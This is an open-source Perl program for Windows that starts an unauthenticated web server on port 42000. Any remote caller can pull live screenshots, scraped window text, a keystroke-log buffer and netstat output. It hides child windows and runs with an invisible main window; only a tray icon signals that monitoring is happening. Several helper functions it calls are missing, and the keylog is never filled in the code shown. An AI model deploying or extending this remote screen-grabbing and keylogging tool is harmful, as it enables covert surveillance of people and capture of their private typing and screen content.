#!wperl.exe
#
# System Remote Auditing Solution i.e.  A screen grabber with an embedded Web Server
# Open Source edition released under the BSD license.
# for multiscreen abilities and campus wide monitoring, contact me directly
#
# Angelos Karageorgiou angelos@unix.gr www.unix.gr
#

package Rautor;

use common::sense;
use IO::Select;
use HTTP::Daemon;
use HTTP::Response;
use HTTP::Status;
use HTTP::Request;
use Win32;
use Win32::API;
use Win32::GUI();
use Win32::GUI  qw (WM_QUERYENDSESSION WM_ENDSESSION WM_CLOSE);
use Win32::GUI::DIBitmap;
use Win32::GuiTest qw|FindWindowLike IsWindowVisible GetWindowText WMGetText IsKeyPressed GetAsyncKeyState|;
use Getopt::Long;
use threads;
use threads::shared;
use IO::Socket::INET;
use Win32::Process;

my $PORT=42000;
my $VERBOSE='';
my $KEYLOG:shared="";
my $TIP="Insecure Live Session Monitor \nFor proper commercial grade security software\nvisit http://www.unix.gr/rautor";
my $SLIDESBITS=16;
my $NumScreens=1;
my $SLEEP=3;


GetOptions (
        'verbose'   => \$VERBOSE,
);

print "Port is $PORT\n" if ( $VERBOSE);

#primary
my $GetDC = new Win32::API('user32', 'GetDC',     ['N'],     'N');
my $RelDC = new Win32::API('user32', 'ReleaseDC', [qw/N N/], 'I');
#Alternate
my $GetDW = new Win32::API('user32','GetDesktopWindow', [],  'N');
my $DESKTOP = $GetDW->Call();

my $imgFname="screen.png";

our  $user=Win32::LoginName();
our  $Node=Win32::NodeName();
our  $domain=Win32::DomainName();

my $RepeatHeader="";

#my $RepeatHeader="<HEAD><META HTTP-EQUIV=REFRESH CONTENT=$SLEEP></HEAD>\r\n
#<table width=\"100%\" height=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\r\n
#";
while (<DATA>) {
	chomp($_);
	$RepeatHeader .= $_ . "\r\n";
}


my $GUID=Win32::GuidGen(); # used for randomization
my $SESSION=substr($GUID,1,length($GUID)-2);
$SESSION=~ s/\-//gi;


my $ICONPATH:shared=getIcon("bull_lined.ico");		
my $redIconFile:shared=getIcon("dot.ico");

my $bullIcon  = new Win32::GUI::Icon($ICONPATH);	
my $redIcon   = new Win32::GUI::Icon($redIconFile);


# GUI STUFF
my $main = Win32::GUI::Window->new(
	-name   => 'Main',
	-width  => 100,
	-height => 100,
	-minsize => [100, 100],
  	-visible => 0, 
);

my $trayIcon = $main->AddNotifyIcon(
	-name	=> 'BULL',
	-icon	=> $bullIcon,
	-tip	=> $TIP ,
);

$HTTP::Daemon::PROTO = "HTTP/1.0";
my $daemon  = HTTP::Daemon->new(Listen=>10,LocalPort=>$PORT, ReuseAddr=>1) || &Shutdown();	
my $webtid=threads->create('web',$daemon,$SESSION,$trayIcon,$bullIcon,$redIcon)->detach();

$main->Hook(WM_CLOSE,\&Shutdown);
$main->Enable();
Win32::GUI::Dialog();
Shutdown();



sub Main_Terminate {
    -1;
}

sub Main_Minimize {
	print "Minimized\n";
    $main->Disable();
    $main->Hide();
    1;
}


 sub BULL_Click {
        $main->Enable();
        $main->Show();
       1;
}


########################################################################################
sub web{
my ($daemon,$SESSION,$trayicon,$bullIcon,$redIcon)=@_;

print "Daemon mode on\n" if ( $VERBOSE);
#main code

	while ( my 	$c = $daemon->accept){	
	set_icon($trayIcon,$redIcon,"Your Session is being monitored");	

	# Verify the caller	
		my @ip = unpack("C4",$c->peeraddr);
		my $ip=join(".",@ip);
		# go for it	
		process_one_req($c,$SESSION,$ip);
		Win32::Sleep(30); # let's deny DDOS :-) millisecs
		threads->yield();
		set_icon($trayIcon,$bullIcon,$TIP);	
		$c->close;						
	}
}

########################################################################################
sub process_one_req {
my $connection = shift;	
my $SESSIONID=shift;
my $IP=shift;
	
	my $RepeatHTML=$RepeatHeader;
	
    my $receiver = $connection->get_request;
	if ( ! $receiver ) {
		return;
	}
	if (! ($receiver->method eq 'GET') ){					# Method GET
       		$connection->send_error(RC_FORBIDDEN);
			return;
	}
	$receiver->url->path =~ m/^\/(.*)$/mi;
	my $path=$1;	

print $path . "\n" if ( $VERBOSE);	
	
	if  ($path eq "monitor8bits" ) {
		$SLIDESBITS=8;
		domonitor($connection,$RepeatHTML,$SESSIONID,$IP);
		return;
	}
	# URL is /monitor or null
	if   ($path eq "monitor16bits" ) {
		$SLIDESBITS=16;
		domonitor($connection,$RepeatHTML,$SESSIONID,$IP);		
		return;
	}
	if ( ($path eq "monitor" ) || ($path eq "" ) ) 	{
		domonitor($connection,$RepeatHTML,$SESSIONID,$IP);
		return;
	}
	
    if  ($path =~ /^screen([1-9]*)\.png$/ )  {	# Screen[1-9].png
		
		my $scrnum=1;
		if ( $1 ) {
			$scrnum=$1;
		}
		my $fname="screen".$scrnum.".png";
		unlink $fname if ( -f  $fname); 
		my $res=screendumper($scrnum);
		my $fname="screen".$scrnum.".png";
		if ( $fname eq "screen.png" ) {
			$fname="screen1.png";
		}
		if ( ! -f $ENV{APPDATA} ."\\". $fname )  {
          		$connection->send_error(404,"Could not grab the screen num $scrnum");
			$connection->close;
			undef($connection);
			return;
		}
       	my $response = HTTP::Response->new(200);
       	$response->push_header('Content-Type','image/png');
		$connection->send_response($response);
		$connection->send_file($ENV{APPDATA}."\\".$fname);
		unlink $fname;
	return;
	}
	
	
	if  ($path eq "scrape" ) {
		my $Text=DumpAnyText();
		my $response = HTTP::Response->new(3000);
		$response->content('<pre>' . $Text . '</pre>');
		$connection->send_response($response);
		return;
	}
	if  ($path eq "keylog" ) {
		my $Text=$KEYLOG;
		$KEYLOG="";
		my $response = HTTP::Response->new(200);
		$response->content('<pre>' . $Text . '</pre>');
		$connection->send_response($response);
		return;
	}
	
   	if  ($path eq "netstat" ) {					# /netstat
    	my $response = HTTP::Response->new(200);
		my $Text=readnetstat("c:\\WINDOWS\\system32\\\\netstat.exe -bn");
		if ( ! $Text ) {
      		$connection->send_error(404,"Could not do netstat");
		} else {
      		$response->content($Text);
			$connection->send_response($response);	
		}
		return;
	}
	
    if  ($path eq "fullnetstat" ) {				# /fullnetstat
    	my $response = HTTP::Response->new(200);
		my $Text=readnetstat("c:\\WINDOWS\\system32\\netstat.exe -bavn");
		if ( ! $Text ) {
        		$connection->send_error(404,"Could not do netstat");
		} else {
    		$response->content($Text);
			$connection->send_response($response);	
		}
		return;	
	} 
	# no matches
	$connection->send_error(RC_FORBIDDEN);
}


######################################################################
sub domonitor{
	my ($connection,$RepeatHTML,$SESSIONID,$IP)=@_;
#	my $span=$NumScreens*3;
#	$RepeatHTML .= "
#	
#	<tr bgcolor=lightgrey> 		
#		<td align=center><font color=red size=2><a href=\"/monitor8bits\">[Monitor in 8-bit mode]</a></font></td> 
#		<td align=center><font color=red size=2><a href=\"/scrape\">[Dump Textual Contents]</a></font></td> 
#		<td align=center><font color=red size=2><a href=\"/monitor16bits\">[Monitor in 16-bit mode]</a></font></td> 		
#	</td> </tr>
#	<tr bgcolor=\#afafff> 			
#		<td colspan=$span><font color=white size=1>Keystrokes: $KEYLOG</font></td> 		
#	</tr>
#	";
#	for (my $i=1;$i<=$NumScreens;$i++){		
#		my $fname="screen".$i.".png";
#		$RepeatHTML .= "<tr>\r\n";
#		$RepeatHTML .= "<td><a href=\"/"  . $fname . "\" target=new\"> 
#			<img src=\"/$fname\" width=\"100%\" height=\"100%\" align=center></a>
#			</td>\r\n";
#		if ( ( $i % 2 ) == 0 ) {
#			$RepeatHTML .= "</tr>\r\n";	
#		}
#	}
	
#	$RepeatHTML .= "</table>";		
	my $RepeatHTML =  $RepeatHeader;
    my $response = HTTP::Response->new(length($RepeatHTML));
    $response->content($RepeatHTML);
	$connection->send_response($response);	
	$KEYLOG=""; # reset untill next call
}



############################################################
sub screendumper{
	my ($i)=shift(@_);

	my $disp="\\\\.\\Display".$i;
	my $fname=$ENV{APPDATA}."\\screen".$i.".png";
 	my $Screen = new Win32::GUI::DC("DISPLAY",$disp);
	if ( $Screen){
   	 	my $image = newFromDC Win32::GUI::DIBitmap($Screen) ;
		my $scaled=scale($image);
	       	if ( $scaled ) {			
			$scaled->SaveToFile($fname);
       		}
		Win32::GUI::DC::ReleaseDC(0,$Screen);
	}
}


############################################################
sub scale{
	my $image=shift;
	
print "BITS $SLIDESBITS\n" if $VERBOSE;

	if ($SLIDESBITS ==8 ) {			
			my $new=$image->ConvertTo8Bits();	
			my $ximage=$new->ColorQuantize();
			return $ximage;
	} elsif ($SLIDESBITS == 16 ) {
			my $newimage=$image->ConvertTo16Bits565();
			return $newimage;
	}
	return $image; # justincase
}


######################################################################

sub getIcon {
	my $icon=shift;
	my $ICONPATH='';

	
	
	#snippet shamelessly stolen from splashscreen.pm
	my @dirs;
	# directory of perl script
	my $tmp = $0; $tmp =~ s/[^\/\\]*$//;
	push @dirs, $tmp;
	# cwd
	push @dirs, ".";
	push @dirs, $ENV{TEMP} if exists $ENV{TEMP};
	push @dirs, $ENV{PAR_TEMP} if exists $ENV{PAR_TEMP};
	push @dirs, $ENV{PAR_TEMP}."/inc" if exists $ENV{PAR_TEMP};

	for my $dir (@dirs) {
		next unless -d $dir;
		print STDERR "Attempting to locate icon $icon under $dir\n" if $VERBOSE;
		if ( -f $dir . "\\" .$icon ) {
			$ICONPATH=$dir ."\\" . $icon;	
			return $ICONPATH;
		}
	}
}

######################################################################
sub set_icon{
my ( $icon,$img,$tip)=@_;
  $icon->Change (            
      -name => 'Tray',
      -icon => $img,
      -tip  => $tip,
    );
}

########################################################################################
BEGIN {	
	# hide child windows like netstat :-)
 	if ( defined &Win32::SetChildShowWindow ){
		Win32::SetChildShowWindow(0) 
 	}
 }

########################################################################################
sub Shutdown{
	print STDERR "Shutdown Called" if ( $VERBOSE);
    $main->AddNotifyIcon(
      -name => 'Tray',
    );
	
	exit;
}

########################################################################################
########################################################################################
########################################################################################

__DATA__
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>

<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
<title>Live Session Monitor (http://www.unix.gr for more)</title>

<script language="JavaScript"><!--
function reloadImage() {
    var now = new Date();
    if (document.images) {
        document.images.screen1.src = 'screen1.png?' + now.getTime();
    }
    setTimeout('reloadImage()',2300);
}
setTimeout('reloadImage()',1000);
//-->
</script>

<body onload="reloadImage()">
<!-- <table width="100%" height="100%" border="5" cellpadding="0" cellspacing="0" style="position:relative">
<tr><td>
-->
<a href="/screen1.png" target=new><img src="/screen1.png" name="screen1"  width=100% height="100%" border=0></a>
<!-- </td></tr></table> -->
</body>
</html>
